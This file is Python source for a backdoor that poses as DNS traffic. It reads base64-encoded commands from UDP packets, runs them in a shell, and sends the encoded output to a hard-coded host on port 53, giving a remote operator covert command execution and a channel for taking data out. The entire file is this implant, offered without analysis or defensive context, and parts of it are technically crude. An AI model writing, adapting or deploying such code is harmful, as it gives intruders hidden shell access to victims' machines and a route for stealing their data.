import socket
import base64
import subprocess

# DNS Communication
dns_server_ip = "192.168.1.6"
dns_server_port = 53

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

# Command Execution
def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True)
        encoded_output = base64.b64encode(output).decode()
    except Exception as e:
        encoded_output = str(e).encode()

    # DNS Query/Response Generation
    domain = f"{encoded_output}.example.com"
    sock.sendto(domain.encode(), (dns_server_ip, dns_server_port))


# Main loop
while True:
    # Receive DNS response
    response, _ = sock.recvfrom(1024)
    encoded_command = response.decode().split(".")[0]

    # Data Decoding
    decoded_command = base64.b64decode(encoded_command).decode()

    # Command Execution
    execute_command(decoded_command)
